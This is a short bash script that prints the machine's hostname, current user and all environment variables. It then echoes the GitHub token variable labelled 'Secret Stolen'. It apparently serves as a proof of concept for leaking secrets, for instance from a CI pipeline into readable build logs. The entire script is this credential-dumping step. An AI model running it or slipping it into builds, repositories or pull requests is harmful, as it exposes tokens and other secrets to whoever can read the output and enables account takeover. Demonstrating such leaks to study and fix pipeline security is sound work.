#!/bin/bash
echo "Hostname: $(hostname)"
echo "Current user: $(whoami)"
echo "Environment variables:"
env

echo "Secret Stolen: $GH_TOKEN"
